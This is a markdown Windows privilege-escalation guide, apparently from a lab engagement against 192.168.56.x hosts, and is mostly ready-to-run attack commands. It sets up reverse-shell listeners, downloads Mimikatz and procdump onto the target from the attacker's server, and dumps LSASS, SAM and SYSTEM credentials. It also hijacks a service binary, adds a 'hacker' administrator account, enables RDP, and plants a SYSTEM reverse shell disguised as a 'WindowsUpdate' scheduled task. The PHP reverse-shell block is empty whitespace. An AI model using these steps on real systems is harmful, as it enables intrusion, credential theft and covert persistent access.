# Windows Privilege Escalation Guide

## Initial Reverse Shell Setup

This is the PHP plugin code we used to get the initial reverse shell:

```php
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
?>
```

### Listener Setup

On your Parrot OS (192.168.56.106), set up the listener:

```bash
# Using socat
socat TCP-LISTEN:4444 STDOUT

# Alternative with netcat
nc -nvlp 4444

# With rlwrap for better shell handling
rlwrap -cAr nc -nvlp 4444
```

## WinPEAS Findings Analysis

Key findings from WinPEAS that can be exploited:

> **Critical: WDigest Enabled**
> 
> WDigest is enabled, allowing plaintext password extraction from LSASS memory.

- **UAC Settings:** EnableLUA is set to 0, making UAC bypass easier
- **Cached Credentials:** cachedlogonscount is 10, potential for credential extraction
- **LSA Protection:** Not enabled, easier LSASS memory access
- **AV Detection:** No AV detected on the system

## Mimikatz for Password Extraction

Since WDigest is enabled, use Mimikatz to extract plaintext passwords:

### On Parrot OS (192.168.56.106):

```bash
# Download Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -O mimikatz.zip
unzip mimikatz.zip

# Start HTTP server
python3 -m http.server 80
```

### On Target Windows (192.168.56.107):

```cmd
# Download and run Mimikatz
cd C:\Windows\Temp
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.56.106/mimikatz.exe', 'mimikatz.exe')"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

## Alternative: Procdump + Mimikatz

If Mimikatz is detected, dump LSASS and analyze offline:

### On Target:

```cmd
# Download Procdump
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.56.106/procdump.exe', 'procdump.exe')"

# Dump LSASS process
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### On Parrot OS:

```bash
# Analyze the dump with Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

## Impacket Techniques

Using Impacket for privilege escalation:

### Dump SAM and SYSTEM hashes:

```cmd
# On target, save registry hives
reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
reg save hklm\security security.hiv
```

### On Parrot OS, extract hashes:

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hiv -system system.hiv LOCAL
```

### PSEXEC for SYSTEM access:

```bash
# If you obtain credentials
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@192.168.56.107
```

## Service-Based Privilege Escalation

Check for misconfigured services:

### Find modifiable services:

```cmd
# Check service permissions
accesschk.exe -uwcqv "NT AUTHORITY\LOCAL SERVICE" * /accepteula

# Using built-in tools
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### If you find a modifiable service:

```cmd
# Stop the service
net stop "ServiceName"

# Replace the binary
copy /y C:\Windows\Temp\malicious.exe "C:\Path\To\Service\Binary.exe"

# Start the service
net start "ServiceName"
```

## Additional Privilege Escalation Techniques

### 1. AlwaysInstallElevated Check

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 2. Unattended Installations

```cmd
# Look for unattended installation files
dir /s *unattend*.xml
dir /s *sysprep*.xml
type C:\Windows\Panther\Unattend.xml 2>nul
```

### 3. Stored Credentials

```cmd
# Check cmdkey stored credentials
cmdkey /list

# Check for saved files with passwords
dir /s *pass*.txt *cred*.txt *config*.txt 2>nul
```

### 4. Scheduled Tasks

```cmd
# List scheduled tasks
schtasks /query /fo LIST /v

# Using PowerShell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | ForEach-Object {($_.TaskName)}
```

## Post-Exploitation

After gaining privileged access:

### 1. Dump all credentials

```cmd
# With Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "sekurlsa::logonpasswords" "exit"
```

### 2. Enable RDP access

```cmd
# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Add firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# If you need to add a user
net user hacker Password123! /add
net localgroup administrators hacker /add
```

### 3. Maintain persistence

```cmd
# Create a scheduled task for persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\reverse_shell.exe" /sc onstart /ru SYSTEM
```